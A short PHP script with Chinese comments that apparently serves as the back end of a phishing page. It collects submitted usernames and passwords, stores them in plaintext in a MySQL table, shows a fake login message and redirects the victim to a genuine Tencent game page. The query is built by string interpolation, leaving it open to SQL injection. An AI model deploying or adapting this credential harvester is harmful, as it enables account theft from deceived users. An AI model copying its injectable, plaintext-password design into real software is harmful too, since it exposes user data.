<?php
//获取全部提交的数据 $_POST
//打印数据
print_r($_POST);
$username = $_POST['username'];
$pwd = $_POST['pwd'];
$time = time();
//通过PHP的PDO拓展保存数据
//1.创建PDO对象
$pdo = new PDO('mysql:dbname=php导入专用','root','root');
//2.执行SQL语句（通过一个指令可以将用输入的账号密码保存到MySQL仓库）
$rs = $pdo->exec("insert into users values (null,'$username','$pwd','$time')");
//3.判断跳转
$realUrl = 'https://syzs.qq.com/sempage/wzrytest/index.html?via=315_BDSEM_76343950_2611530407_74489937329';
if($rs){
    echo"<script>alert('登陆成功！');location.href = '$realUrl'</script>";
}else{
    echo"<script>alert('登陆失败！');location.href = '$realUrl'</script>";
}
?>

